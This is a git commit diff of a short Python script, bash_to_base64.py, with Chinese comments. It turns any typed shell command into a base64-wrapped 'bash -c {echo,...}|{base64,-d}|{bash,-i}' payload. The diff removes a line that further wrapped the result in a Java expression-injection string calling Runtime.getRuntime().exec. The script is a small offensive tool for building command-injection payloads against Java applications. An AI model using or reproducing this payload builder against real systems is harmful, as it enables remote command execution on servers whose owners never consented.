3feb9223f88b6c48bae769c7fc32f797831a9fb8
小狐狸FM <51869871+smallfox233@users.noreply.github.com>
2022-06-18 23:00:12 +0800

    bash命令base64

--- bash_to_base64.py
+++ bash_to_base64.py
@@ -5,7 +5,6 @@ def bash_to_base64(command):
     command = base64.b64encode(command.encode("utf-8"))  # base64编码
     command = command.decode()  # 将bytes转换为string
     command = "bash -c {echo," + command + "}|{base64,-d}|{bash,-i}"  # 转换命令的格式
-    command = "[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('" + command + "')]"
     return command
 command = input("命令: ")
 print(bash_to_base64(command))
